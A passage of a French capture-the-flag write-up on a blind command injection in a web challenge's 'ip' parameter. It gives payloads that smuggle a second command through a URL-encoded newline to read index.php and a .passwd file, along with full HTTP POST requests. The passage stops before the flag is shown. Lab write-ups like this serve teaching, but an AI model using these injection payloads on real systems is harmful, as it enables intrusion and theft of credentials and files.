...
### 4.4. Confirmation avec Burp Collaborator

Pour confirmer l'exécution des commandes, on peut utiliser **Burp Collaborator** ou un serveur contrôlé pour recevoir des données du serveur cible.

---

## 5. Exploitation de la vulnérabilité

### 5.1. Récupération du fichier index.php

Puisque l'injection est aveugle, on doit trouver un moyen d'exfiltrer les données. On peut utiliser **curl** ou **cat** pour envoyer le contenu de fichiers.

**Payload pour récupérer index.php** :
...
Ou encore mieux, on peut **rediriger la sortie vers un fichier accessible** via le web :

```bash
ip=127.0.0.1%0Acat index.php > /tmp/output.txt
```

**Alternative avec POST en binaire** :

En utilisant Burp Suite, on peut envoyer une requête POST qui redirige `index.php` comme fichier binaire :

```
POST /web-serveur/ch53/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%0Acat%20index.php%20%3E%20result.txt
```

### 5.2. Analyse du code source index.php

Après avoir récupéré le contenu de `index.php`, on découvre une ligne importante qui référence un autre fichier :

```php
<?php
// ... code ...
$passwd = file_get_contents('.passwd');
// ... code ...
?>
```

Le fichier **`.passwd`** contient probablement le flag !

### 5.3. Récupération du fichier .passwd

**Payload pour récupérer .passwd** :

```
POST /web-serveur/ch53/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%0Acat%20.passwd
```

Ou en redirigeant vers un fichier accessible :

```bash
ip=127.0.0.1%0Acat .passwd > /tmp/flag.txt
```
...
Après avoir exécuté la commande `cat .passwd`, on obtient le flag :
